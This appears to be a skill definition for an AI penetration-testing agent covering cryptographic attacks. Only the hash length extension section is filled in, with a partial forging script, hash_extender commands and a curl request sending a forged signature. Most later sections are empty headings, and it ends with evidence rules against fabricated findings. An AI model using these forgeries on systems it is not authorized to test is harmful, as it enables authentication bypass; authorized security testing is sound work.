---
name: crypto-toolkit
description: "Cryptographic testing: hash length extension, padding oracle, CBC attacks, key management, JWT algorithm confusion"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, encodeDecode, measureTiming, updateGraph, writeFinding]
triggers: ["cryptographic testing", "hash extension", "padding oracle", "cbc attack", "crypto analysis", "tls testing", "key management", "encryption testing", "cipher attack", "crypto vulnerability"]
contextBoosts: [auth]
mitreAttack: ["T1190", "T1552"]
owaspRefs: ["OWASP Top 10 A02:2021 Cryptographic Failures"]
---

# Cryptographic Testing Toolkit

## When to Use

- JWT tokens present in requests (cookies, Authorization headers)
- Block cipher encryption observed (AES-CBC, DES-CBC, 3DES)
- Hash-based signatures (HMAC-SHA256, MD5-based MACs, custom MACs)
- TLS/SSL connections to target or internal services
- Key material found in source code, configs, or environment variables
- Encrypted parameters in URLs or form fields
- Cookie values that appear to be encrypted blobs
- Password reset tokens, API keys, or session tokens with predictable structure

## Do Not Use

- When target uses authenticated encryption (AES-GCM, ChaCha20-Poly1305) — these are padding-oracle-safe
- When there is no oracle (server returns generic errors for all invalid inputs)
- When you have no ciphertext to manipulate
- When HMAC verification includes a sequence number or timestamp that prevents replay
- During active incident response — crypto testing is recon, not containment

---

## Hash Length Extension Attack

**Applies to:** HMAC-MD5, HMAC-SHA1, HMAC-SHA256 where server uses `hash(secret + message)` instead of `HMAC(secret, message)`

### Detection

```bash
# Signature is a raw digest (32/40/64 hex chars) appended to or beside a parameter
# and the format looks like:  ?data=<user=admin>&sig=8f14e45fceea167a5a36dedd4bea2543
# Test: change any byte of `data` -> signature invalid; but the sig length matches MD5(32)/SHA1(40)/SHA256(64)
echo -n "user=admin" | md5sum    # compare candidate digests with the observed sig
```

### Exploitation

```python
#!/usr/bin/env python3
# Length-extension for SHA256: forge hash(secret || msg || glue || extension) without the secret
import struct

def sha_pad(msg_len: int) -> bytes:
    pad = b'\x80' + b'\x00' * ((55 - msg_len) % 64)
    return pad + struct.pack('>Q', (msg_len * 8) & 0xFFFFFFFFFFFFFFFF)

# known: original message "user=admin", unknown secret length guess = 16
msg = b"user=admin"
ext = b"&user=sysadmin"
glue = sha_pad(len(msg) + SECRET_LEN_GUESS)   # try each plausible secret length
forged_payload = msg + glue + ext             # send as new data param
# recompute signature using the ORIGINAL digest as the chaining state:
# state := unhexlify(orig_sig); run SHA-256 compression over ext + final padding
```

```bash
# Or use the standard tool — hash_extender handles MD5/SHA1/SHA256 variants:
git clone https://github.com/iagox86/hash_extender && cd hash_extender && make
./hash_extender --data 'user=admin' --signature 8f14e45f... \
  --format sha256 --secret-length 16 --append '&user=sysadmin'
```

### Tool Command

```bash
# Verify a forged request end-to-end once the tool emits payload+signature:
curl -s "https://target.com/api?data=user%3Dadmin%80%00...%26user%3Dsysadmin&sig=<forged_sig>"
```

### Decision Tree

1. Sig = plain digest (not base64 JWT/HMAC envelope)? → candidate.
2. Change one data byte → does ONLY the sig check fail? → candidate.
3. Run hash_extender across secret lengths 1–64 until server accepts → CONFIRMED.
4. Server rejects all lengths / uses keyed HMAC library → not vulnerable.

---

## Padding Oracle Attack

**Applies to:** AES-CBC, 3DES-CBC, any block cipher using PKCS#7 padding

### Detection


### Exploitation (CBC Padding Oracle)


### Tool: PadBuster


### Tool: padoracle2 (Python)


---

## CBC Bit Flipping

**Applies to:** AES-CBC where you can modify ciphertext and the server decrypts without authentication

### Technique


### Exploitation


### Detection Checklist


---

## JWT Algorithm Confusion

**Applies to:** JWT implementations that accept `alg` header without validation

### Attack Types

**1. Algorithm Confusion (RS256 → HS256)**


**2. Algorithm None Bypass**


**3. Key Confusion Detection**


### Decision Tree


---

## Weak Key Detection

### DES/3DES Weak Keys


### RSA Weak Key Detection


### Hardcoded Key Detection


---

## TLS Analysis

### Quick Assessment


### Decision Tree


### Certificate Validation Bypass


---

## Timing Side-Channel Detection

### HMAC Comparison Timing


---

## Anti-Hallucination Rules

**CRITICAL: Never fabricate cryptographic findings.**

1. **Algorithm claims require proof.** State the algorithm name, version, and the tool/command that revealed it. Example: "AES-CBC detected via `testssl.sh` output showing `TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256`." Never say "the app likely uses ECB mode" without intercepting and analyzing actual ciphertext.

2. **Padding oracle claims require differential evidence.** Show two requests (valid vs modified ciphertext) with different responses. Include status codes, response bodies, and timing. If you cannot produce a different response for modified input, there is no oracle.

3. **JWT vulnerability claims require the token.** Include the header (decoded `alg` field), the payload (decoded claims), and the verification step. Never claim "algorithm confusion possible" without verifying the server actually accepts the alternate algorithm.

4. **Key strength claims require the key size.** State the exact bit length and the standard it fails (e.g., "RSA-1024 below NIST SP 800-57 minimum of 2048"). Never guess key sizes.

5. **TLS claims require scan output.** Reference the specific tool output (testssl.sh, nmap, sslyze) and the line or finding. Never claim "weak ciphers supported" without listing them.

6. **Bit-flipping claims require the modified ciphertext.** Show the original and modified ciphertext, the resulting plaintext change, and the server's acceptance. If the server uses authenticated encryption (GCM, Poly1305), bit-flipping is not viable — say so.

7. **When uncertain, state the limitation.** "Could not confirm padding oracle due to generic error responses" is a valid finding. Do not invent vulnerability classes that are not supported by evidence.
